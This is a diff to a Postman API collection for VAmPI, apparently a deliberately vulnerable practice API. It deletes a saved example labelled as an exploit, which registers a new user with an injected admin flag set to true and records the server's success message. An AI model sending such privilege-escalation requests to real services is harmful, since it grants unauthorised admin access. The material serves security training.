@@ -251,48 +251,7 @@
 				},
 				"description": "Register new user"
 			},
-			"response": [
-				{
-					"name": "Register new admin user (exploit)",
-					"originalRequest": {
-						"method": "POST",
-						"header": [
-							{
-								"key": "Content-Type",
-								"value": "application/json"
-							},
-							{
-								"key": "Accept",
-								"value": "application/json"
-							}
-						],
-						"body": {
-							"mode": "raw",
-							"raw": "{\n  \"username\": \"new_admin_user\",\n  \"password\": \"test1\",\n  \"email\": \"test1@test1.com\",\n  \"admin\": \"True\"\n}",
-							"options": {
-								"raw": {
-									"language": "json"
-								}
-							}
-						},
-						"url": {
-							"raw": "{{baseUrl}}/users/v1/register",
-							"host": [
-								"{{baseUrl}}"
-							],
-							"path": [
-								"users",
-								"v1",
-								"register"
-							]
-						}
-					},
-					"_postman_previewlanguage": "Text",
-					"header": [],
-					"cookie": [],
-					"body": "{\n    \"message\": \"Successfully registered. Login to receive an auth token.\",\n    \"status\": \"success\"\n}"
-				}
-			]
+			"response": []
 		},
 		{
 			"name": "Login to VAmPI",
